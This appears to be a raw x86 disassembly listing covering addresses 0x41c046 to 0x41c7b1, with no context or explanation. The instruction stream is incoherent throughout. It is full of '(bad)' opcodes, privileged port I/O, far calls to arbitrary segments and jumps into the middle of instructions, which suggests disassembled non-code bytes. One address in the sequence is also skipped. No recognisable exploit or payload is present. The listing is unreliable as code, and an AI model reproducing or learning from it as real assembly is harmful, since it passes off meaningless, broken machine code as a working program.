  41c046:	xor    DWORD PTR gs:[ecx-0x3870e6b4],ebx
  41c04d:	pop    esp
  41c04e:	pop    esi
  41c04f:	pop    esp
  41c050:	pusha  
  41c051:	call   0x526e7270
  41c056:	sub    dl,BYTE PTR [ebp-0x3bbcfaf8]
  41c05c:	arpl   WORD PTR [ecx],si
  41c05e:	out    dx,al
  41c05f:	mov    edi,0xc3c38f79
  41c064:	jge    0x41c008
  41c066:	rcr    DWORD PTR [eax],1
  41c068:	scas   eax,DWORD PTR es:[edi]
  41c069:	jl     0x41c05b
  41c06b:	inc    ebx
  41c06c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c06d:	outs   dx,BYTE PTR ds:[esi]
  41c06e:	and    al,0xe8
  41c070:	cmc    
  41c071:	xchg   bx,ax
  41c073:	mov    BYTE PTR [ecx+ebx*2-0x3a],ah
  41c077:	mov    dl,0x20
  41c079:	outs   dx,DWORD PTR ds:[esi]
  41c07a:	sub    ebp,edx
  41c07c:	std    
  41c07d:	sti    
  41c07e:	idiv   DWORD PTR [eax]
  41c080:	fcomp  st(7)
  41c082:	and    ebx,DWORD PTR [ecx+0x2bcaf24c]
  41c088:	pop    ds
  41c089:	(bad)  
  41c08a:	out    dx,eax
  41c08b:	div    DWORD PTR [ebx]
  41c08d:	sbb    cl,BYTE PTR [edi-0x6b654a97]
  41c093:	xchg   esi,eax
  41c094:	dec    ebx
  41c095:	les    edx,FWORD PTR [ebx+0x9]
  41c098:	outs   dx,BYTE PTR ds:[esi]
  41c099:	fnstsw WORD PTR [edx-0x73130ab3]
  41c09f:	loope  0x41c111
  41c0a1:	dec    eax
  41c0a2:	sub    al,0x16
  41c0a4:	add    esp,DWORD PTR [eax+0x77]
  41c0a7:	ja     0x41c030
  41c0a9:	outs   dx,BYTE PTR ds:[esi]
  41c0aa:	mov    bh,0x43
  41c0ac:	sub    BYTE PTR [esp+eiz*4],bl
  41c0af:	shr    DWORD PTR [edx+esi*2+0x70],1
  41c0b3:	jo     0x41c03d
  41c0b5:	in     al,dx
  41c0b6:	repz xchg ecx,eax
  41c0b8:	retf   
  41c0b9:	out    0x39,eax
  41c0bb:	cmp    DWORD PTR [esi],edi
  41c0bd:	mov    ds:0x4e93efd7,al
  41c0c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0c3:	cmp    BYTE PTR [ebx],bh
  41c0c5:	cmp    DWORD PTR [ebp-0x30],esp
  41c0c8:	out    dx,eax
  41c0c9:	shl    edx,1
  41c0cb:	sti    
  41c0cc:	inc    eax
  41c0cd:	adc    BYTE PTR [eax+0x26],cl
  41c0d0:	jecxz  0x41c106
  41c0d2:	inc    edi
  41c0d3:	sbb    bh,BYTE PTR [ebp-0x52bb7198]
  41c0d9:	xchg   DWORD PTR [esi+0x2b],ebp
  41c0dc:	mov    bl,0xcc
  41c0de:	sub    al,0x25
  41c0e0:	xor    al,0x9c
  41c0e2:	push   ebp
  41c0e3:	imul   esp,edx,0xc
  41c0e6:	cmp    esi,edx
  41c0e8:	mov    ebx,esi
  41c0ea:	adc    edx,ebp
  41c0ec:	add    dh,bl
  41c0ee:	lea    ecx,[ebx-0x7e]
  41c0f1:	in     eax,0x59
  41c0f3:	mov    edx,0xb2ca7cc2
  41c0f8:	and    eax,0xad1b5c43
  41c0fd:	(bad)  
  41c0fe:	sbb    al,BYTE PTR [edi-0x3601fc61]
  41c104:	ja     0x41c164
  41c106:	and    ebx,esi
  41c108:	sbb    DWORD PTR [ecx-0x31],edi
  41c10b:	inc    esp
  41c10c:	add    bh,bh
  41c10e:	in     eax,dx
  41c10f:	retf   
  41c110:	sar    DWORD PTR [edi-0x60d528ec],1
  41c116:	adc    ah,bh
  41c118:	mov    bl,0x35
  41c11a:	push   ebx
  41c11b:	push   cs
  41c11c:	shl    bh,1
  41c11e:	out    dx,al
  41c11f:	mov    ebp,0x8d237b7
  41c124:	push   cs
  41c125:	mov    edx,0xb52cce6f
  41c12a:	outs   dx,BYTE PTR ds:[esi]
  41c12b:	jp     0x41c0fd
  41c12d:	jle    0x41c16a
  41c12f:	xor    dh,BYTE PTR [eax]
  41c131:	int    0x39
  41c133:	repnz outs dx,DWORD PTR ds:[esi]
  41c135:	sbb    BYTE PTR [eax],ah
  41c137:	jmp    0xb36e4a8c
  41c13c:	mov    ds:0x901a22dc,eax
  41c141:	adc    DWORD PTR ds:0x89d86ec9,esp
  41c147:	adc    cl,BYTE PTR [ebp+0x7e5eed86]
  41c14d:	aas    
  41c14e:	fstp   DWORD PTR [esi+ecx*1+0x49]
  41c152:	adc    dh,cl
  41c154:	stc    
  41c155:	jl     0x41c0fb
  41c157:	xchg   edx,eax
  41c158:	sub    DWORD PTR [edx-0x1f],eax
  41c15b:	xor    BYTE PTR [ecx-0x2ca2e5b4],ch
  41c161:	data16 or dl,BYTE PTR [ebp-0x3bb0ed33]
  41c168:	cmp    DWORD PTR [ecx],edi
  41c16a:	mov    ds:0x4c926cdd,al
  41c170:	es push ecx
  41c172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c173:	push   ebx
  41c174:	dec    esi
  41c175:	dec    esi
  41c176:	dec    esi
  41c177:	call   0x92669bf2
  41c17c:	or     DWORD PTR [edx-0xf],esp
  41c17f:	cmp    ch,bh
  41c181:	outs   dx,BYTE PTR ds:[esi]
  41c182:	xchg   edi,eax
  41c183:	push   0x2c0a3674
  41c188:	adc    al,0xe
  41c18a:	push   ebx
  41c18b:	pop    eax
  41c18c:	sub    BYTE PTR [edx-0x386dbb4],dl
  41c192:	call   0x27e928b8
  41c197:	push   0xa52b369a
  41c19c:	imul   ebp,DWORD PTR [edx],0x5484c993
  41c1a2:	cmp    cl,BYTE PTR [ebp+0x26]
  41c1a5:	xchg   ebx,eax
  41c1a6:	inc    ecx
  41c1a7:	adc    BYTE PTR [edi+0x58],ah
  41c1aa:	inc    ecx
  41c1ab:	xor    bl,BYTE PTR [ecx-0x4021e20]
  41c1b1:	aam    0xea
  41c1b3:	xor    eax,0x5b018386
  41c1b8:	pop    ebx
  41c1b9:	aaa    
  41c1ba:	sub    BYTE PTR [esp+ebp*1],ch
  41c1bd:	adc    BYTE PTR [ebp+0x5b5f59c7],cl
  41c1c3:	mov    ds:0xbdce7e7a,eax
  41c1c8:	jnp    0x41c1c1
  41c1ca:	imul   esi,DWORD PTR [edx+ebx*1],0x6ccafcf8
  41c1d1:	jg     0x41c171
  41c1d3:	popa   
  41c1d4:	push   eax
  41c1d5:	cs das 
  41c1d7:	mov    ds:0x8f0e7e28,eax
  41c1dc:	(bad)  
  41c1dd:	cmp    DWORD PTR [esp+edi*1],edi
  41c1e0:	inc    esp
  41c1e1:	shl    DWORD PTR [ebp-0x4],cl
  41c1e4:	retf   0x3d2c
  41c1e7:	or     DWORD PTR [edi+0x254a9422],eax
  41c1ed:	cs das 
  41c1ef:	imul   edi,DWORD PTR [eax+edi*2],0xfffffff8
  41c1f3:	nop
  41c1f4:	pop    edx
  41c1f5:	in     eax,dx
  41c1f6:	adc    al,ch
  41c1f8:	scas   eax,DWORD PTR es:[edi]
  41c1f9:	push   eax
  41c1fa:	sub    al,0x16
  41c1fc:	icebp  
  41c1fd:	stc    
  41c1fe:	std    
  41c1ff:	fdivr  QWORD PTR [edx-0x28aae48b]
  41c205:	clc    
  41c206:	retf   0xbf97
  41c209:	int3   
  41c20a:	(bad)  
  41c20c:	sub    DWORD PTR [edx-0x29148cd8],esp
  41c212:	sub    eax,0xa904f1e2
  41c217:	je     0x41c1b3
  41c219:	dec    eax
  41c21a:	xor    al,0xca
  41c21c:	loope  0x41c1df
  41c21e:	ds mov ebp,0xdfbf00fe
  41c224:	inc    edi
  41c225:	cs xchg edi,eax
  41c227:	mov    ds:0xbbb06ad9,eax
  41c22c:	mov    ebx,0x26416983
  41c231:	popf   
  41c232:	es xchg ecx,eax
  41c234:	mov    WORD PTR [ebx+0x3246b2b2],?
  41c23a:	xchg   ecx,eax
  41c23b:	pusha  
  41c23c:	ja     0x41c2b5
  41c23e:	xchg   DWORD PTR [ecx-0x41],eax
  41c241:	dec    edi
  41c242:	and    al,0x1c
  41c244:	and    DWORD PTR [edx],edx
  41c246:	lea    esi,[eax+0x70]
  41c249:	mov    al,0xcf
  41c24b:	inc    cl
  41c24d:	shr    DWORD PTR [ebp+ebx*4-0x4fea8687],0x10
  41c255:	add    al,0x81
  41c257:	(bad)  
  41c258:	pusha  
  41c259:	mov    dl,ah
  41c25b:	div    DWORD PTR [ebx+0x3a41b1b6]
  41c261:	xchg   ebp,eax
  41c262:	out    0xe4,al
  41c264:	clc    
  41c265:	or     bl,dl
  41c267:	xor    BYTE PTR [ecx+0x5e],bl
  41c26a:	pop    esi
  41c26b:	mov    eax,ds:0xab516cd1
  41c270:	pop    ebp
  41c271:	nop
  41c272:	dec    edx
  41c273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c274:	sbb    DWORD PTR [ebp+0x5f9f9c86],ecx
  41c27a:	adc    BYTE PTR [eax+0x2],dl
  41c27d:	mov    BYTE PTR [edx+0x2152b548],dl
  41c283:	mov    bh,0x50
  41c285:	and    BYTE PTR [esi+ebx*4],bl
  41c288:	lea    esi,[ecx+0x4b]
  41c28b:	and    eax,0x9d548c53
  41c290:	dec    ecx
  41c291:	std    
  41c292:	cwde   
  41c293:	inc    edx
  41c294:	mov    bh,0x82
  41c296:	popa   
  41c297:	jnp    0x41c30b
  41c299:	addr16 push edi
  41c29b:	mov    eax,ds:0xb3df8124
  41c2a0:	inc    esi
  41c2a1:	or     eax,0xebc68e66
  41c2a6:	in     eax,dx
  41c2a7:	ror    esi,0xff
  41c2aa:	in     eax,dx
  41c2ab:	in     eax,0x2b
  41c2ad:	into   
  41c2ae:	out    0x26,al
  41c2b0:	imul   DWORD PTR [edi-0x40]
  41c2b3:	aam    0x94
  41c2b5:	in     al,0x7f
  41c2b7:	je     0x41c268
  41c2b9:	neg    DWORD PTR [esi-0x6101b6e7]
  41c2bf:	mov    BYTE PTR [eax],al
  41c2c1:	push   ds
  41c2c2:	(bad)  
  41c2c3:	fidivr DWORD PTR [edi-0x13]
  41c2c6:	(bad)  
  41c2c8:	stc    
  41c2c9:	xchg   edi,eax
  41c2ca:	lahf   
  41c2cb:	pop    ss
  41c2cc:	jl     0x41c24e
  41c2ce:	daa    
  41c2cf:	mov    edi,0x39505777
  41c2d4:	jmp    0x41c27f
  41c2d6:	add    eax,0xfb39eecf
  41c2db:	addr16 dec ecx
  41c2dd:	pushf  
  41c2de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2df:	add    eax,0xc70c0ece
  41c2e4:	adc    BYTE PTR [eax],bl
  41c2e6:	mov    edx,0xd0e8098d
  41c2eb:	xor    edi,ebp
  41c2ed:	add    al,0x2
  41c2ef:	sbb    DWORD PTR [ecx],0x50944609
  41c2f5:	aad    0x29
  41c2f7:	test   DWORD PTR [edx-0x7f],eax
  41c2fa:	jle    0x41c2b3
  41c2fc:	dec    ebx
  41c2fd:	sub    bl,BYTE PTR [ebp+0x528e1426]
  41c303:	scas   eax,DWORD PTR es:[edi]
  41c304:	aaa    
  41c305:	or     BYTE PTR [edi+0x2993a4c3],al
  41c30b:	sbb    ch,ch
  41c30d:	es stos BYTE PTR es:[edi],al
  41c30f:	stos   BYTE PTR es:[edi],al
  41c310:	push   ecx
  41c311:	cs das 
  41c313:	xor    ebx,DWORD PTR [ecx-0x24242674]
  41c319:	and    edx,DWORD PTR [ebp-0x45454eb4]
  41c31f:	(bad)  
  41c320:	jo     0x41c352
  41c322:	in     al,0xf2
  41c324:	repnz adc al,BYTE PTR [ecx+0x14]
  41c328:	sub    BYTE PTR [ebp+0x74536796],dl
  41c32e:	push   es
  41c32f:	jge    0x41c35d
  41c331:	shl    DWORD PTR [edx-0xebbaf48],cl
  41c337:	stc    
  41c338:	mov    dh,al
  41c33a:	mov    ds:0xea0d9ab4,al
  41c33f:	mov    ch,0x1a
  41c341:	mov    DWORD PTR [eax-0x64],edi
  41c344:	loop   0x41c398
  41c346:	or     DWORD PTR [ebp+0x37],ecx
  41c349:	cwde   
  41c34a:	mov    WORD PTR [edi],fs
  41c34c:	xor    al,0x1a
  41c34e:	jne    0x41c3c7
  41c350:	test   BYTE PTR [esi-0x53],dl
  41c353:	push   ecx
  41c354:	daa    
  41c355:	popf   
  41c356:	dec    esp
  41c357:	jb     0x41c3d5
  41c359:	jb     0x41c31d
  41c35b:	fsubp  st(6),st
  41c35d:	push   ds
  41c35e:	leave  
  41c35f:	push   esp
  41c360:	xchg   edx,eax
  41c361:	push   edx
  41c362:	test   eax,0xa295224c
  41c367:	fucomp st(5)
  41c369:	mov    al,ds:0xa1860a28
  41c36e:	jecxz  0x41c367
  41c370:	sti    
  41c371:	mov    DWORD PTR [ebp-0x5d],eax
  41c374:	test   BYTE PTR [ebx+0x73f3cc11],ah
  41c37a:	cli    
  41c37b:	mov    ebp,0x9f7e832e
  41c380:	aad    0xd5
  41c382:	xor    eax,0xf0565756
  41c387:	sti    
  41c388:	std    
  41c389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c38a:	adc    dh,BYTE PTR [ecx+0x26]
  41c38d:	shr    DWORD PTR [ecx],cl
  41c38f:	pop    edi
  41c390:	cld    
  41c391:	rcl    BYTE PTR [edi],cl
  41c393:	sbb    DWORD PTR [edi],ecx
  41c395:	inc    edi
  41c396:	pop    eax
  41c397:	xchg   esi,eax
  41c398:	(bad)
  41c39b:	div    BYTE PTR [ecx]
  41c39d:	loop   0x41c370
  41c39f:	cmp    BYTE PTR [edx-0x5ab16e52],bl
  41c3a5:	js     0x41c394
  41c3a7:	mov    ch,0xd7
  41c3a9:	test   al,0xd7
  41c3ab:	push   0xffffffc8
  41c3ad:	jle    0x41c3ee
  41c3af:	pop    ebx
  41c3b0:	pop    ebx
  41c3b1:	mov    bl,0xd9
  41c3b3:	add    DWORD PTR [esi-0x3bb76e9b],eax
  41c3b9:	imul   esi,DWORD PTR [ebp-0x755597a6],0xb248cb24
  41c3c3:	les    ebp,FWORD PTR [eax+0x34]
  41c3c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3c7:	pop    edx
  41c3c8:	test   eax,0x993ae9a0
  41c3cd:	dec    esp
  41c3ce:	call   0xb0a0:0x251952a5
  41c3d5:	mov    dh,0xb6
  41c3d7:	xchg   BYTE PTR [esi-0x1c842317],ah
  41c3dd:	int    0x59
  41c3df:	retf   
  41c3e0:	outs   dx,DWORD PTR ds:[esi]
  41c3e1:	sub    ah,al
  41c3e3:	jmp    0x9e31:0xaaaa0aca
  41c3ea:	mov    WORD PTR [eax-0x2b],ss
  41c3ed:	pop    ecx
  41c3ee:	aas    
  41c3ef:	mov    edi,0xeb73f3e2
  41c3f4:	into   
  41c3f5:	sbb    eax,0xe716ed5a
  41c3fa:	out    0xe7,eax
  41c3fc:	dec    esp
  41c3fd:	(bad)  
  41c3fe:	push   ebx
  41c3ff:	push   esp
  41c400:	push   ebp
  41c401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c402:	aad    0x6e
  41c404:	mov    cl,0xbd
  41c406:	mov    ebp,0xf0a0204d
  41c40b:	in     al,dx
  41c40c:	mov    bl,0x77
  41c40e:	dec    ecx
  41c40f:	adc    ch,BYTE PTR es:[eax-0x2c44b966]
  41c416:	es xchg edi,eax
  41c418:	int    0xa1
  41c41a:	xchg   esp,eax
  41c41b:	add    dl,BYTE PTR [edi+edx*1]
  41c41e:	xchg   edi,eax
  41c41f:	call   0x13667f9a
  41c424:	dec    ecx
  41c425:	outs   dx,BYTE PTR ds:[esi]
  41c426:	fnstsw WORD PTR [edx+0x40d9a345]
  41c42c:	adc    al,0x61
  41c42e:	jne    0x41c49d
  41c430:	adc    eax,0x9dd19c51
  41c435:	pop    ss
  41c436:	pop    ss
  41c437:	push   ss
  41c438:	sbb    DWORD PTR [edi-0x3a],ecx
  41c43b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c43c:	shr    BYTE PTR [ecx+0x26],cl
  41c43f:	xchg   ebx,eax
  41c440:	or     DWORD PTR [edx+0x15303228],edx
  41c446:	push   esp
  41c447:	jnp    0x41c3f4
  41c449:	adc    al,dh
  41c44b:	jl     0x41c478
  41c44d:	mov    bl,0xc4
  41c44f:	mov    esp,0x7677e46a
  41c454:	xor    edx,esp
  41c456:	icebp  
  41c457:	inc    dl
  41c459:	in     al,dx
  41c45a:	mov    ecx,0x39920586
  41c45f:	add    ecx,DWORD PTR [esi-0x263f6b63]
  41c465:	fwait
  41c466:	sub    bl,bh
  41c468:	and    DWORD PTR [ecx],edi
  41c46a:	scas   al,BYTE PTR es:[edi]
  41c46b:	jle    0x41c469
  41c46d:	aaa    
  41c46e:	(bad)  
  41c46f:	fwait
  41c470:	pop    ss
  41c471:	xchg   esi,eax
  41c472:	inc    dl
  41c474:	aas    
  41c475:	jl     0x41c474
  41c477:	in     al,dx
  41c478:	aas    
  41c479:	mov    ah,0x9e
  41c47b:	mov    esp,0x444f7915
  41c480:	add    BYTE PTR [edi],bh
  41c482:	cmc    
  41c483:	arpl   WORD PTR [edi],bx
  41c485:	jnp    0x41c4c5
  41c487:	je     0x41c47d
  41c489:	mov    ebx,0x803905f
  41c48e:	out    dx,al
  41c48f:	scas   al,BYTE PTR es:[edi]
  41c490:	cmp    al,0x73
  41c492:	lea    cx,[ebp+0x3]
  41c496:	ja     0x41c47f
  41c498:	popf   
  41c499:	gs int3 
  41c49b:	inc    ebx
  41c49c:	jl     0x41c48a
  41c49e:	cld    
  41c49f:	fidiv  WORD PTR [eax+0x52735f15]
  41c4a5:	add    BYTE PTR [ebx+0xe],ah
  41c4a8:	add    BYTE PTR [edx],bh
  41c4aa:	js     0x41c46c
  41c4ac:	fs add al,bh
  41c4af:	bound  eax,QWORD PTR [esi-0x33da06b7]
  41c4b5:	leave  
  41c4b6:	sbb    BYTE PTR [ecx-0x6e],dl
  41c4b9:	imul   esi,DWORD PTR [edi+0x49d3a4db],0xc31efdfa
  41c4c3:	loope  0x41c44d
  41c4c5:	(bad)
  41c4c8:	cs das 
  41c4ca:	das    
  41c4cb:	mov    eax,0xbf20bf3c
  41c4d0:	push   eax
  41c4d1:	pusha  
  41c4d2:	xor    bl,BYTE PTR [ecx-0x7c4c444e]
  41c4d8:	sub    BYTE PTR [ecx+0x4],cl
  41c4db:	cld    
  41c4dc:	or     dl,BYTE PTR [edi-0x2245aa19]
  41c4e2:	cs jle 0x41c484
  41c4e5:	lahf   
  41c4e6:	pusha  
  41c4e7:	sub    BYTE PTR [eax-0x51],cl
  41c4ea:	xlat   BYTE PTR ds:[ebx]
  41c4eb:	inc    ebp
  41c4ec:	mov    ah,0xbb
  41c4ee:	cmc    
  41c4ef:	loop   0x41c4c2
  41c4f1:	sbb    BYTE PTR [ecx-0x2040fd88],dh
  41c4f7:	(bad)  
  41c4f8:	jo     0x41c532
  41c4fa:	cmp    BYTE PTR fs:[eax],bl
  41c4fd:	xchg   edx,eax
  41c4fe:	int    0xe5
  41c500:	sbb    DWORD PTR [edi-0x420d0299],ecx
  41c506:	out    dx,al
  41c507:	sub    al,0x4c
  41c509:	cs xchg ebp,eax
  41c50b:	retf   0xfa68
  41c50e:	ins    BYTE PTR es:[edi],dx
  41c50f:	test   al,0x47
  41c511:	xor    BYTE PTR [eax],bl
  41c513:	inc    eax
  41c514:	aad    0x35
  41c516:	je     0x41c575
  41c518:	daa    
  41c519:	fwait
  41c51a:	int    0x52
  41c51c:	scas   eax,DWORD PTR es:[edi]
  41c51d:	aad    0xd8
  41c51f:	aas    
  41c520:	cwde   
  41c521:	or     eax,0xe42858e7
  41c526:	(bad)  
  41c528:	fsub   QWORD PTR [edx]
  41c52a:	sbb    BYTE PTR [edx+esi*4],cl
  41c52d:	mov    dh,0xb6
  41c52f:	into   
  41c530:	fs cmp ah,ch
  41c533:	(bad)  
  41c534:	mov    ebp,0x1e1d1c7b
  41c539:	popa   
  41c53a:	pop    edx
  41c53b:	mov    DWORD PTR es:[eax+0x2],edi
  41c53f:	retf   
  41c540:	and    BYTE PTR [eax+0x28],0x4c
  41c544:	sub    bl,BYTE PTR [ebp+0x71efdba2]
  41c54a:	mov    al,0x7f
  41c54c:	sub    BYTE PTR [edx-0x67f7df97],0x86
  41c553:	leave  
  41c554:	js     0x41c58a
  41c556:	(bad)
  41c55b:	retf   
  41c55c:	dec    ebx
  41c55d:	push   0xfffffff5
  41c55f:	cli    
  41c560:	lods   al,BYTE PTR ds:[esi]
  41c561:	xor    al,BYTE PTR [edx+0x223478c5]
  41c567:	xchg   ebx,eax
  41c568:	retf   
  41c569:	adc    cl,BYTE PTR [edi-0x40c7463b]
  41c56f:	in     al,0xc9
  41c571:	xchg   ebx,eax
  41c572:	daa    
  41c573:	hlt    
  41c574:	cli    
  41c575:	jge    0x41c539
  41c577:	mov    eax,ds:0x8e5c9910
  41c57c:	je     0x41c5a8
  41c57e:	int    0xc6
  41c580:	mov    BYTE PTR [esi],0x27
  41c583:	daa    
  41c584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c585:	ins    BYTE PTR es:[edi],dx
  41c586:	outs   dx,DWORD PTR ds:[esi]
  41c587:	aas    
  41c588:	out    0xfc,al
  41c58a:	loop   0x41c50e
  41c58c:	jl     0x41c5bc
  41c58e:	iret   
  41c58f:	cli    
  41c590:	cli    
  41c591:	push   es
  41c592:	or     BYTE PTR [edx],al
  41c594:	test   eax,0xd3550a54
  41c599:	ins    BYTE PTR es:[edi],dx
  41c59a:	cmp    dh,BYTE PTR [edi+ecx*4-0x798e9d7b]
  41c5a1:	hlt    
  41c5a2:	aas    
  41c5a3:	jl     0x41c565
  41c5a5:	jmp    0x54eacf9b
  41c5aa:	call   0x891:0xc2358df5
  41c5b1:	icebp  
  41c5b2:	pop    eax
  41c5b3:	mov    WORD PTR [esi-0x41],?
  41c5b6:	inc    edi
  41c5b7:	mov    bl,0xd9
  41c5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5ba:	push   eax
  41c5bb:	pop    esp
  41c5bc:	pusha  
  41c5bd:	mov    eax,ds:0xf6f1e050
  41c5c2:	arpl   dx,bp
  41c5c4:	cmc    
  41c5c5:	push   es
  41c5c6:	add    DWORD PTR [eax-0x80],0xd1cf2e5c
  41c5cd:	icebp  
  41c5ce:	adc    DWORD PTR [ebx],edi
  41c5d0:	dec    edi
  41c5d1:	push   ds
  41c5d2:	xchg   ebx,eax
  41c5d3:	dec    ecx
  41c5d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5d5:	pop    ecx
  41c5d6:	pop    eax
  41c5d7:	pop    esp
  41c5d8:	pushf  
  41c5d9:	adc    DWORD PTR [esi+eiz*4+0x13],edi
  41c5dd:	and    dl,BYTE PTR [ecx+0x7c44f130]
  41c5e3:	mov    dh,0x34
  41c5e5:	fs xor al,0x63
  41c5e8:	inc    ebp
  41c5e9:	(bad)  
  41c5ea:	bound  esi,QWORD PTR [ecx+0x6]
  41c5ed:	sbb    DWORD PTR [esi],0xffffff89
  41c5f0:	fs adc al,bl
  41c5f3:	xor    BYTE PTR [ecx],dl
  41c5f5:	inc    ebp
  41c5f6:	add    ebx,ecx
  41c5f8:	mov    dl,0x68
  41c5fa:	ss sbb ebp,eax
  41c5fd:	xchg   esi,eax
  41c5fe:	adc    BYTE PTR [esi-0x27],0xa1
  41c602:	sar    BYTE PTR [ebx],1
  41c604:	popf   
  41c605:	scas   eax,DWORD PTR es:[edi]
  41c606:	pusha  
  41c607:	mov    bh,0xef
  41c609:	xor    ecx,edx
  41c60b:	mul    ah
  41c60d:	push   cs
  41c60e:	xor    al,ch
  41c610:	in     al,0xf6
  41c612:	cs loopne 0x41c59c
  41c615:	popf   
  41c616:	xor    cl,BYTE PTR [eax-0x5d33520d]
  41c61c:	mov    bl,0x5b
  41c61e:	rol    esi,1
  41c620:	add    BYTE PTR [ecx+ecx*1+0x2c],al
  41c624:	fisttp QWORD PTR [edx]
  41c626:	mov    WORD PTR [esp+ecx*8-0x6a0d803d],ss
  41c62d:	fidivr DWORD PTR [ebx+0x62]
  41c630:	inc    ecx
  41c631:	jmp    0xb043e8b1
  41c636:	idiv   BYTE PTR [edi-0x9]
  41c639:	jae    0x41c679
  41c63b:	lahf   
  41c63c:	in     eax,0xae
  41c63e:	test   eax,0xa8ef9a43
  41c643:	adc    eax,ebp
  41c645:	cdq    
  41c646:	push   edx
  41c647:	cmp    ebp,DWORD PTR [ebx-0x55]
  41c64a:	sub    eax,0xa5e7d340
  41c64f:	aas    
  41c650:	rol    DWORD PTR [esi],cl
  41c652:	sti    
  41c653:	inc    esp
  41c654:	rcr    esi,1
  41c656:	cmp    eax,0x99fece6f
  41c65b:	out    0xcc,al
  41c65d:	loop   0x41c62a
  41c65f:	add    dh,ah
  41c661:	xor    eax,0xc81b3698
  41c666:	call   0xb273286f
  41c66b:	mov    ecx,0x9356ed1c
  41c670:	mov    ds:0xa51a344e,ax
  41c676:	fldcw  WORD PTR [edx+0x71]
  41c679:	jb     0x41c6f7
  41c67b:	mov    BYTE PTR [eax+0x41],ah
  41c67e:	jg     0x41c650
  41c680:	addr16 jg 0x41c702
  41c683:	lahf   
  41c684:	inc    esp
  41c685:	cmp    al,0x8e
  41c687:	in     al,dx
  41c688:	xchg   ebx,eax
  41c689:	cmp    DWORD PTR [edi-0x1dd9b7aa],ebp
  41c68f:	in     al,0xb
  41c691:	add    eax,0x3e0a952a
  41c696:	lds    ecx,FWORD PTR [edi-0x4f]
  41c699:	pop    eax
  41c69a:	inc    esp
  41c69b:	adc    al,0x24
  41c69d:	add    al,BYTE PTR [ecx]
  41c69f:	test   DWORD PTR [esi-0x45],ebp
  41c6a2:	lea    esp,[ecx+0x58]
  41c6a5:	and    al,0x12
  41c6a7:	or     DWORD PTR [edx-0x6a0ef3f],eax
  41c6ad:	retf   0x336b
  41c6b0:	push   ds
  41c6b1:	and    BYTE PTR [ecx-0x779b316d],0x46
  41c6b8:	jecxz  0x41c6ae
  41c6ba:	sti    
  41c6bb:	pop    ebp
  41c6bc:	and    al,0x59
  41c6be:	es xchg ebp,eax
  41c6c0:	dec    edx
  41c6c1:	and    DWORD PTR [eax],ecx
  41c6c3:	jmp    0x41c649
  41c6c5:	ret    
  41c6c6:	adc    DWORD PTR [esi+0x1f0f11a3],eax
  41c6cc:	ds rcl al,0x75
  41c6d0:	xor    al,0x75
  41c6d2:	inc    edx
  41c6d3:	cmp    BYTE PTR [edx],dl
  41c6d5:	jno    0x41c700
  41c6d7:	mov    ebp,0x1ed825a6
  41c6dc:	dec    ebp
  41c6dd:	call   0x5ea3:0x49a69381
  41c6e4:	addr16 mov ds:0xd4aa,al
  41c6e8:	imul   esi,DWORD PTR [ebp-0x62],0xffffffb9
  41c6ec:	jge    0x41c689
  41c6ee:	inc    eax
  41c6ef:	and    BYTE PTR [eax+0x16344580],cl
  41c6f5:	in     eax,0x4b
  41c6f7:	pop    edi
  41c6f8:	cli    
  41c6f9:	adc    al,BYTE PTR [edi+0x5e5c0787]
  41c6ff:	pop    esp
  41c700:	repnz icebp 
  41c702:	(bad)  
  41c703:	jg     0x41c699
  41c705:	out    0xee,eax
  41c707:	fisub  WORD PTR [ebp-0x474fd070]
  41c70d:	push   esp
  41c70e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c70f:	pop    edx
  41c710:	cmp    eax,0x87a3e1e7
  41c715:	mov    WORD PTR [edi+0x23],es
  41c718:	and    al,0x51
  41c71a:	in     al,0xb9
  41c71c:	out    0x9e,eax
  41c71e:	and    edx,DWORD PTR [ebp-0x79f5eeb6]
  41c724:	lock sti 
  41c726:	jge    0x41c724
  41c728:	fsubp  st(7),st
  41c72a:	inc    DWORD PTR [ecx]
  41c72c:	cmc    
  41c72d:	fisub  DWORD PTR ds:0x9b98f1e3
  41c733:	mov    bh,0x6e
  41c735:	adc    DWORD PTR [ebx],esi
  41c737:	or     al,0xba
  41c739:	mov    ebp,0x88204a3e
  41c73e:	sub    al,0xfb
  41c740:	xor    BYTE PTR [ebx+edx*4],cl
  41c743:	jo     0x41c77d
  41c745:	test   BYTE PTR [esi-0x626263e5],ch
  41c74b:	mov    al,0xbf
  41c74d:	ja     0x41c70f
  41c74f:	jns    0x41c736
  41c751:	mov    WORD PTR [esi+edi*2-0x7f],?
  41c755:	idiv   DWORD PTR [edi+0x7ffe25ff]
  41c75b:	neg    dh
  41c75d:	cmp    al,0xc6
  41c75f:	mov    dl,0xec
  41c761:	mov    esi,0xbb9cfbef
  41c766:	mov    ebp,0x7bed5ebd
  41c76b:	push   edi
  41c76c:	ja     0x41c7c5
  41c76e:	out    dx,eax
  41c76f:	fnsave [ebx]
  41c771:	in     al,0x70
  41c773:	dec    eax
  41c774:	mov    dl,BYTE PTR [esp+eax*2+0x7128a653]
  41c77b:	xchg   ecx,eax
  41c77c:	gs pop ecx
  41c77e:	and    DWORD PTR [ebx],0x4024124
  41c784:	stc    
  41c785:	(bad)  
  41c786:	mov    DWORD PTR [ebx-0x37f8de03],esi
  41c78c:	jmp    0xe24e:0xd8918120
  41c793:	clc    
  41c794:	pop    eax
  41c796:	dec    esi
  41c797:	sbb    al,0x20
  41c799:	mov    dl,0x2d
  41c79b:	sub    esi,edx
  41c79d:	and    ch,BYTE PTR [eax]
  41c79f:	inc    esi
  41c7a0:	add    al,0x39
  41c7a2:	mov    gs,WORD PTR ds:0x9222b2c9
  41c7a8:	adc    al,ch
  41c7aa:	xchg   BYTE PTR gs:0x557756bd,bh
  41c7b1:	ja     0x41c828
